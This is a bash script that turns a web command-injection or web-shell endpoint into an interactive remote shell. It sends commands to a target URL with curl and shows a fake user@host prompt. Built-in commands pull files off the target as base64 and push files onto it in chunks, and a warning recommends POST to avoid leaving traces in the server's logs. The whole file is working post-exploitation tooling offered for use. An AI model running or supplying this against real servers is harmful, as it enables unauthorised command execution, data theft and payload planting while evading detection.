#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

DEBUG=true

# Text color variables
#txtund=$(tput sgr 0 1)          # Underline
txtbld=$(tput bold)             # Bold
bldred=${txtbld}$(tput setaf 1) #  red
bldgreen=${txtbld}$(tput setaf 2) #  red
bldblu=${txtbld}$(tput setaf 4) #  blue
bldwht=${txtbld}$(tput setaf 7) #  white
txtrst=$(tput sgr0)             # Reset
info="${bldwht}[*]${txtrst}"    # Feedback
#pass="${bldblu}\[*\]${txtrst}"
warn="${bldred}[!]${txtrst}"
#ques="${bldblu}[?]${txtrst}"

METHOD="$1"
URL="$2"
PARAMS="$3"

if [[ "$#" -ge 4 ]]; then
  NUMBEF="$4"
else
  NUMBEF="0"
fi

if [[ "$#" -ge 5 ]]; then
  NUMAFT="$5"
else
  NUMAFT="0"
fi

if [[ "$NUMBEF" -ne 0 ]]; then
  CMDRMBEF="|sed '${NUMBEF}d'"
else
  CMDRMBEF=""
fi

if [[ "$NUMAFT" -ne 0 ]]; then
  CMDRMAFT="|head -n -${NUMAFT}"
else
  CMDRMAFT=""
fi

case "$METHOD" in
  "GET"|"get")      echo "${warn}${txtbld} GET requests parameters are commonly logged in the webserver! Use POST for better OPSEC!${txtrst}";
                    SCMD="curl -sk '$URL?${PARAMS}";;
  "POST"|"post")    SCMD="curl -sk '$URL' -d'${PARAMS}";;
  *)                echo "${warn} Error parsing METHOD!"; exit ;;
esac

RUSER="$(bash -c "${SCMD}whoami'${CMDRMBEF}${CMDRMAFT}")"
if [[ "$RUSER" == "root" ]]; then
  PROMPT='#'
else
  PROMPT='$'
fi

RHNAME="$(bash -c "${SCMD}hostname'${CMDRMBEF}${CMDRMAFT}")"
RHOME="$(bash -c "${SCMD}pwd'${CMDRMBEF}${CMDRMAFT}")"
RDIR="$RHOME"

while true; do
  read -p "${bldgreen}${RUSER}@${RHNAME}${txtrst}:${bldblu}${RDIR}${txtrst}${PROMPT} " -r
  REPLY="$(sed "s, ,%20,g" <<< "${REPLY}")" #Fix spaces
  REPLY="$(sed "s,&,%26,g" <<< "${REPLY}")" #Fix ampersand
  REPLY="$(sed "s,',%27,g" <<< "${REPLY}")" #Fix single quote

  # download file
  if [[ "$REPLY" =~ ^!down(load)?%20 ]]; then
    FILE="$(echo -n "$REPLY" | sed 's,%20, ,g' | cut -d' ' -f2-)"
    if [[ -e "$FILE" ]]; then
      echo "${warn} File already exists!"
      continue
    fi
    CMD="${SCMD}base64%20-w0%20\"$(sed 's, ,%20,g' <<< "${FILE}")\"' -o '${FILE}.tmp.b64'${CMDRMBEF}${CMDRMAFT}"
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}" || echo "${warn} Error downloading '${FILE}'"
    base64 -d "${FILE}.tmp.b64" > "${FILE}" && rm "${FILE}.tmp.b64"
    echo "${info} Download successful!"
    continue
  fi

  # upload file
  if [[ "$REPLY" =~ ^!up(load)?%20 ]]; then
    FILE="$(echo -n "$REPLY" | sed 's,%20, ,g' | cut -d' ' -f2-)"
    base64 -w1337 "${FILE}" > "${FILE}.tmp.b64"
    while read -r line || [[ -n $line ]]; do
      line="$(sed 's,=,%3D,g' <<< "$line")" # fix equal
      line="$(sed 's,+,%2B,g' <<< "$line")" # fix plus
      line="$(sed 's,/,%2F,g' <<< "$line")" # fix slash
      CMD="${SCMD}echo%20${line}%20>>${FILE}.tmp.b64'"
      echo "> $CMD"
      bash -c "${CMD}" || echo "${warn} Error uploading '${FILE}'"
    done < "${FILE}.tmp.b64"
    CMD="${SCMD}base64%20-d%20\"${FILE}.tmp.b64\">\"${FILE}\"'${CMDRMBEF}${CMDRMAFT}"
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}" || echo "${warn} Communication error while renaming '${FILE}'"

    # cleanup
    rm "${FILE}.tmp.b64"
    CMD="${SCMD}rm%20\"${FILE}.tmp.b64\"'${CMDRMBEF}${CMDRMAFT}"
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}" || echo "${warn} Communication error cleanup"
    continue
  fi

  # local cmds
  if [[ "$REPLY" =~ ^! ]]; then
    REPLY="$(sed "s,%20, ,g" <<< "${REPLY}")" #Fix spaces
    REPLY="$(sed "s,%26,&,g" <<< "${REPLY}")" #Fix ampersand
    REPLY="$(sed "s,%27,',g" <<< "${REPLY}")" #Fix single quote
    CMD="$(sed 's,^!,,' <<< "$REPLY")"
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}"
    continue
  fi

  # cmd overwrite
  if [[ "$REPLY" =~ ^cd$ ]]; then
    RDIR="$RHOME"
    continue
  elif [[ "$REPLY" == 'cd%20..' ]]; then
    RDIR="$(echo -n "$RDIR" | cut -d/ -f1-"$(echo -n "$RDIR" | awk -F'/' '{print NF-1}')")"
    continue
  elif [[ "$REPLY" =~ ^cd%20.*$ ]]; then
    CMD="${SCMD}cd%20${RDIR}%26%26${REPLY}%26%26pwd||pwd'${CMDRMBEF}${CMDRMAFT}"
    $DEBUG && echo "> $CMD"
    RDIR=$(bash -c "${CMD}")
    continue
  elif [[ "$REPLY" == "pwd" ]]; then
    echo "$RDIR"
    continue
  elif [[ "$REPLY" =~ ^(ls(%20-a?l?h?)?|dir)$ ]]; then
    CMD="${SCMD}${REPLY}+${RDIR}'${CMDRMBEF}${CMDRMAFT}"
  elif [[ "$REPLY" =~ ^ll$ ]]; then
    CMD="${SCMD}ls+-al+${RDIR}'"
  elif [[ "$REPLY" =~ ^less%20 ]]; then
    REPLY="$(sed 's,^less,cat,' <<< "$REPLY")"
    CMD="${SCMD}${REPLY}'${CMDRMBEF}${CMDRMAFT}"
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}|less"
    continue
  elif [[ "$REPLY" =~ ^exit$ ]]; then
    echo "${warn} Exiting!"
    exit
  else
    CMD="${SCMD}${REPLY}'${CMDRMBEF}${CMDRMAFT}"
  fi

  if [ -n "$REPLY" ]; then
    $DEBUG && echo "> $CMD"
    bash -c "${CMD}" || echo "${warn} Communication error!"
  fi
done
